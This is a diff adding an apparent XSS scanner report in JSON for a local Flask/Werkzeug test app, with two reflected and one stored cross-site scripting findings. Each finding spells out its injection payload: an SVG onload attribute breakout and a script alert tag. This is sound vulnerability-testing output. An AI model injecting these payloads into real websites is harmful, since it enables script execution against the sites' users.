@@ -1,0 +1,53 @@
+{
+  "scan_summary": {
+    "target_url": "http://192.168.1.13:5000/",
+    "scan_start_time": "2025-08-13T15:37:36+07:00",
+    "scan_end_time": "2025-08-13T15:37:39+07:00",
+    "total_duration": "3s",
+    "scanners_run": [
+      "xss"
+    ],
+    "technologies_detected": {
+      "WebServer": "Werkzeug/2.3.7 Python/3.12.3"
+    },
+    "total_urls_discovered": 11,
+    "total_parameterized_requests": 0,
+    "total_vulnerabilities_found": 3
+  },
+  "vulnerabilities": [
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://192.168.1.13:5000/view?file=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS571520668%3E",
+      "Parameter": "file",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS571520668\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS571520668\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Reflected XSS",
+      "URL": "http://192.168.1.13:5000/?search=%22%3E%3CsVg%2Fonload%3Dconfirm%281%29+class%3DDursgoXSS701456672%3E",
+      "Parameter": "search",
+      "Payload": "\"\u003e\u003csVg/onload=confirm(1) class=DursgoXSS701456672\u003e",
+      "Location": "query",
+      "Details": "Injected payload was executed in a 'Attribute' context. Description: Breaks out of an attribute and uses an SVG tag with onload event. (DURSGO_MARKER)",
+      "severity": "high",
+      "evidence": "\u003csVg/onload=confirm(1) class=DursgoXSS701456672\u003e",
+      "remediation": "Sanitize user input and implement proper output encoding based on context.",
+      "scanner_name": "xss-reflected"
+    },
+    {
+      "VulnerabilityType": "Stored XSS",
+      "URL": "http://192.168.1.13:5000/product/2",
+      "Parameter": "content",
+      "Payload": "\u003cscript\u003ealert('DursgoXSS993770067')\u003c/script\u003e",
+      "Location": "body",
+      "Details": "Stored XSS detected in comments at http://192.168.1.13:5000/product/2.",
+      "severity": "high",
+      "scanner_name": "xss-stored"
+    }
+  ]
+}
